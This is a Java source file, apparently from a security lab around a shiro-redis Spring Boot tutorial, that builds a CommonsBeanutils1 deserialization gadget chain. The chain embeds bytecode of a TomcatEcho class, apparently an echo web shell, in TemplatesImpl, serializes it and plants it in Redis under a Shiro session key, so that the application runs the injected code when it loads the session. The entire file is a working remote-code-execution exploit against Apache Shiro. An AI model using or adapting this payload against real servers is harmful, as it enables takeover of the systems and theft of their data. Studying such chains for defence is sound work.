package org.crazycake.shiroredisspringboottutorial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import redis.clients.jedis.Jedis;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class InjectSessionEchoShell {
    public static void main(String[] args) throws Exception {
        Jedis jedis = new Jedis("redis://127.0.0.1:6379");
        String s = "shiro:session:wuhu~run";
        byte[] injectByte = commonsBeanutils1();
        jedis.set(s.getBytes(), injectByte);
    }

    public static byte[] commonsBeanutils1() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(TomcatEcho.class.getName());
        byte[] classByteArray = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        ReflectionUtil.setFieldValue(templates, "_name", "f");
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{classByteArray});
        ReflectionUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        ReflectionUtil.setFieldValue(comparator, "property", "outputProperties");
        ReflectionUtil.setFieldValue(queue, "queue", new Object[]{templates, templates});
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream ou = new ObjectOutputStream(bos)) {
            ou.writeObject(queue);
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
